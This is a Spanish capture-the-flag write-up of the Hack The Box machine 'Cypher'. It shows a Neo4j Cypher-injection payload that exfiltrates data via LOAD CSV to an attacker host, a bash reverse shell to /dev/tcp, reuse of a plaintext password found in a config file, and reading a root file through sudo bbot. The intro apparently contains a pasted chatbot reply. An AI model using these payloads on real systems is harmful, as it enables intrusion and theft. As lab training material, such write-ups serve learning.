---
layout: single
title: cypher - Hack The Box
excerpt: "La máquina Cypher en Hack The Box es un desafío que pone a prueba tus habilidades en criptografía y seguridad informática. Los participantes deben identificar y explotar vulnerabilidades en bases de datos orientadas a grafos, como Neo4j, y manejar técnicas de inyección de comandos. El objetivo es obtener acceso privilegiado al sistema y, finalmente, escalar privilegios hasta obtener el control total de la máquina. Este tipo de ejercicios es ideal para mejorar tus competencias en seguridad cibernética y comprensión de sistemas de bases de datos no relacionales.​ En cuanto al comando que mencionas, sudo /usr/local/bin/bbot -cy /root/root.txt --debug, parece que estás intentando ejecutar una herramienta llamada bbot con privilegios de superusuario, apuntando al archivo /root/root.txt y habilitando el modo de depuración. Sin embargo, sin más contexto sobre bbot y su funcionalidad específica, es difícil proporcionar una explicación detallada de lo que este comando realiza"
date: 2020-04-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-cypher/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - burp suite
  - sql cypher
  - escalada de privilegios
---

![](/assets/images/htb-writeup-cypher/portada.png)

La máquina Cypher en Hack The Box es un desafío que pone a prueba tus habilidades en criptografía y seguridad informática. Los participantes deben identificar y explotar vulnerabilidades en bases de datos orientadas a grafos, como Neo4j, y manejar técnicas de inyección de comandos. El objetivo es obtener acceso privilegiado al sistema y, finalmente, escalar privilegios hasta obtener el control total de la máquina. Este tipo de ejercicios es ideal para mejorar tus competencias en seguridad cibernética y comprensión de sistemas de bases de datos no relacionales.​ En cuanto al comando que mencionas, sudo /usr/local/bin/bbot -cy /root/root.txt --debug, parece que estás intentando ejecutar una herramienta llamada "bbot" con privilegios de superusuario, apuntando al archivo /root/root.txt y habilitando el modo de depuración. Sin embargo, sin más contexto sobre "bbot" y su funcionalidad específica, es difícil proporcionar una explicación detallada de lo que este comando realiza.

## Portscan

```
nmap AP -sV -A -T4 


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: GRAPH ASM
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

## puertos

encontramos 2 puertos

- 22
- 80





![](/assets/images/htb-writeup-cypher/inicio.png)

ya que vemos 2 puertos abiertos eso nos quiere decir que el ataque tiene que ser via web

## injec cypher

![](/assets/images/htb-writeup-cypher/injec1.png)

ya despudes de hacer muchos intentos puede hacerme una reverse shell no puse los demas intento ya que seria una perdida de tiempo y igual no funcionaba

```
{"username":"admin' OR 1=1  LOAD CSV FROM 'http://10.10.11.14/ppp='+h.value AS y Return ''//","noes":"noes"}
```

ahora con lo ya visto es hora de hacernos una reverse shell ya que sabesmos que pode comprobar el comando nos hacemos un script en bash con lo que dije la verse shell pongan el /bin/bash para que sea interpretado


![](/assets/images/htb-writeup-cypher/injec2.png)

```
┌──(noesholk㉿noes)-[~]
└─$ python3 -m http.server 80                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.57 - - [04/Mar/2025 06:47:23] code 404, message File not found
10.10.11.57 - - [04/Mar/2025 06:47:23] "GET /ppp=9f54ca4c130be6d529a56dee59dc2b2090e43acf HT
TP/1.1" 404 -
10.10.11.57 - - [04/Mar/2025 06:56:14] "GET /shell.sh HTTP/1.1" 200 -
10.10.11.57 - - [04/Mar/2025 07:16:23] "GET /shell.sh HTTP/1.1" 200 -
10.10.11.57 - - [04/Mar/2025 07:21:59] "GET /shell.sh HTTP/1.1" 200 -
```

reverse shell

```
┌──(noesholk㉿noes)-[~]
└─$ cat shell.sh             
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.72/9999 0>&1
```

```
┌──(noesholk㉿noes)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.15.72] from (UNKNOWN) [10.10.11.57] 
bash: cannot set terminal process group (1413): Inappr
bash: no job control in this shell
neo4j@cypher:/$ ls
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
neo4j@cypher:/$ ls
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
neo4j@cypher:/$ ls
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
neo4j@cypher:/$ ls
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
neo4j@cypher:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
neo4j@cypher:/$ ^Z
zsh: suspended  nc -lvnp 9999
                                                      
                             
┌──(noesholk㉿noes)-[~]
└─$ stty raw -echo;fg                    
[3]    continued  nc -lvnp 9999
                               reset xterm
neo4j@cypher:/$ export SHELL=bash 
neo4j@cypher:/$ export TERM=xterm
neo4j@cypher:/$ ls
bin                dev   lib64              mnt   run 
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin
boot               home  lost+found         proc  sbin
cdrom              lib   media              root  srv 
neo4j@cypher:/$ ls
bin                dev   lib64              mnt   run 
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin
boot               home  lost+found         proc  sbin
cdrom              lib   media              root  srv 
neo4j@cypher:/$ ls
bin                dev   lib64              mnt   run 
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin
boot               home  lost+found         proc  sbin
cdrom              lib   media              root  srv 
neo4j@cypher:/$ ls
bin                dev   lib64              mnt   run 
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin
boot               home  lost+found         proc  sbin
cdrom              lib   media              root  srv 
neo4j@cypher:/$ cd /home
neo4j@cypher:/home$ ls
graphasm
neo4j@cypher:/home$ cd graphasm
neo4j@cypher:/home/graphasm$ ls
bbot_preset.yml  user.txt
neo4j@cypher:/home/graphasm$ cat user.txt
cat: user.txt: Permission denied
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
neo4j@cypher:/home/graphasm$ su neo4j
Password: 
su: Authentication failure
neo4j@cypher:/home/graphasm$ ls
bbot_preset.yml  user.txt
neo4j@cypher:/home/graphasm$ su graphasm
Password: 
su: Authentication failure
neo4j@cypher:/home/graphasm$ cU4btyib.20xtCMCXkBmerhK
cU4btyib.20xtCMCXkBmerhK: command not found
neo4j@cypher:/home/graphasm$ su graphasm
Password: 
graphasm@cypher:~$
```

## usuario graphasm

ya que pudimos encontrar la contraña del usurio facil literal estaba regalada esta maquina ahora nos volveremos root no tengo muchas expectativas en esta maquina hablo de que no creo que sea dificil


```
┌──(noesholk㉿noes)-[~]
└─$ ssh graphasm@cypher.htb                      
The authenticity of host 'cypher.htb (10.10.11.57)' can't be establi
ED25519 key fingerprint is SHA256:u2MemzvhD6xY6z0eZp5B2G3vFuG+dPBlRF
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
Warning: Permanently added 'cypher.htb' (ED25519) to the list of kno
graphasm@cypher.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Mar  4 07:41:58 AM UTC 2025

  System load:  0.4               Processes:             247
  Usage of /:   72.6% of 8.50GB   Users logged in:       1
  Memory usage: 54%               IPv4 address for eth0: 10.10.11.57
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how
   just raised the bar for easy, resilient and secure K8s cluster de

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts.
nection or proxy settings


Last login: Tue Mar 4 07:41:59 2025 from 10.10.15.72
graphasm@cypher:~$ ls
bbot_preset.yml  user.txt
graphasm@cypher:~$ cat user.txt
e46a552edf0bd866a78e98a616240a0f
graphasm@cypher:~$ cat /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
graphasm@cypher:~$ cat /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
graphasm@cypher:~$ cat /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
graphasm@cypher:~$ cat /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

parece que hay un script que podemos ejecutar como root


El archivo /usr/local/bin/bbot es un script de envoltura para ejecutar bbot dentro de un entorno virtual de Python administrado por pipx


El comando ejecuta bbot con privilegios de superusuario, usando Python. El script importa bbot.cli.main, ajusta sys.argv[0] y lo ejecuta. Parece procesar /root/root.txt en modo debug. Para más detalles, verifica which bbot, bbot --help o inspecciona su código fuente


```
sudo /usr/local/bin/bbot -cy /root/root.txt --debu
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[DBUG] Preset bbot_cli_main: Adding module "python" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "txt" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "csv" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "stdout" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "json" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "aggregate" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "dnsresolve" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "cloudcheck" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "excavate" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "speculate" of type "internal"
[VERB] 
[VERB] ### MODULES ENABLED ###
[VERB] 
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | Module     | Type     | Needs API Key   | Description                   | Flags    
     | Consumed Events      | Produced Events    |
[VERB] +============+==========+=================+===============================+==========
=====+======================+====================+
[VERB] | csv        | output   | No              | Output to CSV                 |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | json       | output   | No              | Output to Newline-Delimited   |          
     | *                    |                    |
[VERB] |            |          |                 | JSON (NDJSON)                 |          
     |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | python     | output   | No              | Output via Python API         |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | stdout     | output   | No              | Output to text                |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | txt        | output   | No              | Output to text                |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | cloudcheck | internal | No              | Tag events by cloud provider, |          
     | *                    |                    |
[VERB] |            |          |                 | identify cloud resources like |          
     |                      |                    |
[VERB] |            |          |                 | storage buckets               |          
     |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | dnsresolve | internal | No              |                               |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | aggregate  | internal | No              | Summarize statistics at the   | passive, 
safe |                      |                    |
[VERB] |            |          |                 | end of a scan                 |          
     |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | excavate   | internal | No              | Passively extract juicy       | passive  
     | HTTP_RESPONSE,       | URL_UNVERIFIED,    |
[VERB] |            |          |                 | tidbits from scan data        |          
     | RAW_TEXT             | WEB_PARAMETER      |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | speculate  | internal | No              | Derive certain event types    | passive  
     | AZURE_TENANT,        | DNS_NAME, FINDING, |
[VERB] |            |          |                 | from others by common sense   |          
     | DNS_NAME,            | IP_ADDRESS,        |
[VERB] |            |          |                 |                               |          
     | DNS_NAME_UNRESOLVED, | OPEN_TCP_PORT,     |
[VERB] |            |          |                 |                               |          
     | HTTP_RESPONSE,       | ORG_STUB           |
[VERB] |            |          |                 |                               |          
     | IP_ADDRESS,          |                    |
[VERB] |            |          |                 |                               |          
     | IP_RANGE, SOCIAL,    |                    |
[VERB] |            |          |                 |                               |          
     | STORAGE_BUCKET, URL, |                    |
[VERB] |            |          |                 |                               |          
     | URL_UNVERIFIED,      |                    |
[VERB] |            |          |                 |                               |          
     | USERNAME             |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] Loading word cloud from /root/.bbot/scans/enigmatic_gregory/wordcloud.tsv
[DBUG] Failed to load word cloud from /root/.bbot/scans/enigmatic_gregory/wordcloud.tsv: [Er
rno 2] No such file or directory: '/root/.bbot/scans/enigmatic_gregory/wordcloud.tsv'
[INFO] Scan with 0 modules seeded with 0 targets (0 in whitelist)
[WARN] No scan modules to load
[DBUG] Installing python - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 
'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "python"
[DBUG] Installing speculate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [
], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "speculate"
[DBUG] Installing txt - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'sh
ell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "txt"
[DBUG] Installing excavate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': []
, 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "excavate"
[DBUG] Installing cloudcheck - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': 
[], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "cloudcheck"
[DBUG] Installing csv - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'sh
ell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "csv"
[DBUG] Installing stdout - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 
'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "stdout"
[DBUG] Installing dnsresolve - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': 
[], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "dnsresolve"
[DBUG] Installing aggregate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [
], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "aggregate"
[DBUG] Installing json - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 's
hell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "json"
[VERB] Loading 0 scan modules: 
[VERB] Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate
[VERB] Loaded module "aggregate"
[VERB] Loaded module "cloudcheck"
[VERB] Loaded module "dnsresolve"
[VERB] Loaded module "excavate"
[VERB] Loaded module "speculate"
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[VERB] Loading 5 output modules: csv,json,python,stdout,txt
[VERB] Loaded module "csv"
[VERB] Loaded module "json"
[VERB] Loaded module "python"
[VERB] Loaded module "stdout"
[VERB] Loaded module "txt"
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[VERB] Setting up modules
[DBUG] _scan_ingress: Setting up module _scan_ingress
[DBUG] _scan_ingress: Finished setting up module _scan_ingress
[DBUG] dnsresolve: Setting up module dnsresolve
[DBUG] dnsresolve: Finished setting up module dnsresolve
[DBUG] aggregate: Setting up module aggregate
[DBUG] aggregate: Finished setting up module aggregate
[DBUG] cloudcheck: Setting up module cloudcheck
[DBUG] cloudcheck: Finished setting up module cloudcheck
[DBUG] internal.excavate: Setting up module excavate
[DBUG] internal.excavate: Including Submodule CSPExtractor
[DBUG] internal.excavate: Including Submodule EmailExtractor
[DBUG] internal.excavate: Including Submodule ErrorExtractor
[DBUG] internal.excavate: Including Submodule FunctionalityExtractor
[DBUG] internal.excavate: Including Submodule HostnameExtractor
[DBUG] internal.excavate: Including Submodule JWTExtractor
[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor
[DBUG] internal.excavate: Including Submodule ParameterExtractor
[DBUG] internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAM
ETER events
[DBUG] internal.excavate: Including Submodule SerializationExtractor
[DBUG] internal.excavate: Including Submodule URLExtractor
[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: 684e719f45ca509ae008b48344c6e0e
8

[DBUG] output.csv: Setting up module csv
[DBUG] output.csv: Finished setting up module csv
[DBUG] output.json: Setting up module json
[DBUG] output.json: Finished setting up module json
[DBUG] output.python: Setting up module python
[DBUG] output.python: Finished setting up module python
[DBUG] output.stdout: Setting up module stdout
[DBUG] output.stdout: Finished setting up module stdout
[DBUG] output.txt: Setting up module txt
[DBUG] output.txt: Finished setting up module txt
[DBUG] internal.speculate: Setting up module speculate
[INFO] internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
[DBUG] internal.speculate: Finished setting up module speculate
[DBUG] _scan_egress: Setting up module _scan_egress
[DBUG] _scan_egress: Finished setting up module _scan_egress
[DBUG] Setup succeeded for aggregate (success)
[DBUG] Setup succeeded for speculate (success)
[DBUG] Setup succeeded for csv (success)
[DBUG] Setup succeeded for stdout (success)
[DBUG] Setup succeeded for cloudcheck (success)
[DBUG] Setup succeeded for _scan_egress (success)
[DBUG] Setup succeeded for _scan_ingress (success)
[DBUG] Setup succeeded for json (success)
[DBUG] Setup succeeded for dnsresolve (success)
[DBUG] Setup succeeded for txt (success)
[DBUG] Setup succeeded for python (success)
[INFO] internal.excavate: Compiling 10 YARA rules
[DBUG] internal.excavate: Finished setting up module excavate
[DBUG] Setup succeeded for excavate (success)
[DBUG] Setting intercept module dnsresolve._incoming_event_queue to previous intercept modul
e _scan_ingress.outgoing_event_queue
[DBUG] Setting intercept module cloudcheck._incoming_event_queue to previous intercept modul
e dnsresolve.outgoing_event_queue
[DBUG] Setting intercept module _scan_egress._incoming_event_queue to previous intercept mod
ule cloudcheck.outgoing_event_queue
[SUCC] Setup succeeded for 12/12 modules.
[TRCE] Command: /usr/local/bin/bbot -cy /root/root.txt --debu
[SUCC] Scan ready. Press enter to execute enigmatic_gregory

[TRCE] Ran BBOT v2.1.0.4939rc at 2025-03-04 07:49:03.591376, command: /usr/local/bin/bbot -c
y /root/root.txt --debu
[TRCE] Target: {'seeds': [], 'whitelist': [], 'blacklist': [], 'strict_scope': False, 'hash'
: 'd0dc1cf9bf61884f8e7982e0b1b87954bd9ee9c7', 'seed_hash': 'da39a3ee5e6b4b0d3255bfef95601890
afd80709', 'whitelist_hash': 'da39a3ee5e6b4b0d3255bfef95601890afd80709', 'blacklist_hash': '
da39a3ee5e6b4b0d3255bfef95601890afd80709', 'scope_hash': '43b1e995dbead10e335145327cf24f8d0e
c38f88'}
[TRCE] Preset: {'description': 'enigmatic_gregory', 'config': {'modules': {'excavate': {'cus
tom_yara_rules': '/root/root.txt'}}}, 'debug': True}
[WARN] No scan targets specified
[SUCC] Starting scan enigmatic_gregory
[VERB] Starting module worker loops
[VERB] 12 modules started
[DBUG] Setting scan status to STARTING
[DBUG] Setting scan status to RUNNING
[VERB] _scan_ingress: Target: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 
'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] _scan_ingress: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 
'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[DBUG] _scan_ingress: Intercepting SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216b
e1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] _scan_ingress: Forwarding SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1
', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] _scan_egress: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': '
enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[SCAN]                  enigmatic_gregory (SCAN:48e2ca3881fb654180f79bc76b208c5113216be1)   
    TARGET  (in-scope, target)
[DBUG] _scan_egress: Intercepting SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be
1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] _scan_egress: Forwarding SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1'
, 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.csv: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) because precheck suc
ceeded
[DBUG] output.json: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', '
name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) because precheck su
cceeded
[DBUG] output.python: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1',
 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) because precheck 
succeeded
[DBUG] output.stdout: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1',
 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) because precheck 
succeeded
[DBUG] output.txt: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) because precheck suc
ceeded
[DBUG] output.csv: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name':
 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) from TARGET
[DBUG] output.csv: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 'en
igmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[DBUG] output.csv: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.csv: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c511321
6be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.json: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name'
: 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) from TARGET
[DBUG] output.json: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 'e
nigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[DBUG] output.json: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', '
name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.json: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c51132
16be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.stdout: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'nam
e': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) from TARGET
[DBUG] output.stdout: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 
'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[DBUG] output.stdout: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1',
 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.stdout: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c511
3216be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.txt: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name':
 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) from TARGET
[DBUG] output.txt: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 'en
igmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[DBUG] output.txt: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.txt: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c511321
6be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'})
[DBUG] output.python: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'nam
e': 'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) from TARGET
[DBUG] output.python: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 
'enigmatic_grego...", module=TARGET, tags={'in-scope', 'target'}) passed post-check
[INFO] Finishing scan
[DBUG] aggregate: Queueing FINISHED("FINISHED", module=None, tags={'aggregate'}) because its
 type is FINISHED
[DBUG] internal.excavate: Queueing FINISHED("FINISHED", module=None, tags={'excavate'}) beca
use its type is FINISHED
[DBUG] output.csv: Queueing FINISHED("FINISHED", module=None, tags={'csv'}) because its type
 is FINISHED
[DBUG] output.json: Queueing FINISHED("FINISHED", module=None, tags={'json'}) because its ty
pe is FINISHED
[DBUG] output.python: Queueing FINISHED("FINISHED", module=None, tags={'python'}) because it
s type is FINISHED
[DBUG] output.stdout: Queueing FINISHED("FINISHED", module=None, tags={'stdout'}) because it
s type is FINISHED
[DBUG] output.txt: Queueing FINISHED("FINISHED", module=None, tags={'txt'}) because its type
 is FINISHED
[DBUG] internal.speculate: Queueing FINISHED("FINISHED", module=None, tags={'speculate'}) be
cause its type is FINISHED
[VERB] Completed finish()
[DBUG] Setting scan status to FINISHING
[DBUG] aggregate: Got FINISHED("FINISHED", module=None, tags={'aggregate'}) from None
[DBUG] internal.excavate: Got FINISHED("FINISHED", module=None, tags={'excavate'}) from None
[DBUG] output.csv: Got FINISHED("FINISHED", module=None, tags={'csv'}) from None
[DBUG] output.json: Got FINISHED("FINISHED", module=None, tags={'json'}) from None
[DBUG] output.stdout: Got FINISHED("FINISHED", module=None, tags={'stdout'}) from None
[DBUG] output.txt: Got FINISHED("FINISHED", module=None, tags={'txt'}) from None
[DBUG] internal.speculate: Got FINISHED("FINISHED", module=None, tags={'speculate'}) from No
ne
[DBUG] output.python: Got FINISHED("FINISHED", module=None, tags={'python'}) from None
[VERB] Completed final finish()
[SCAN]                  enigmatic_gregory (SCAN:48e2ca3881fb654180f79bc76b208c5113216be1)   
    TARGET  (in-scope)
[DBUG] output.csv: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) because precheck succeeded
[DBUG] output.json: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', '
name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) because precheck succeeded
